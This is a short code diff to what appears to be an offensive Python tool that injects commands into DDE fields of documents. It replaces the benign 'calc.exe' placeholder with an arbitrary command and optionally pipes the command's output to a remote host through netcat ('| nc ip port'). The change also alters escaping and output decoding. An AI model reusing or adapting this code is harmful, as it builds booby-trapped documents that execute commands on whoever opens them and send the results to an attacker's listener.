@@ -10,19 +10,16 @@ def extract_dde(data):
     return data[dde_index:dde_end]
 
 def rewrite_dde(data, command, ip, port):
-    # replace \'s with \\\\
-    # don't ask me why
-    command = command.replace("\\", "\\\\\\\\")
     if ip and port:
         command = "{} | nc {} {}".format(command, ip, port)
     command = command.encode("utf-8")
 
     print("Before:")
-    print(extract_dde(data))
+    print(extract_dde(data).decode('ascii'))
 
     data = data.replace(b"calc.exe", command)
     print("After:")
-    print(extract_dde(data))
+    print(extract_dde(data).decode('ascii'))
 
     return data
 
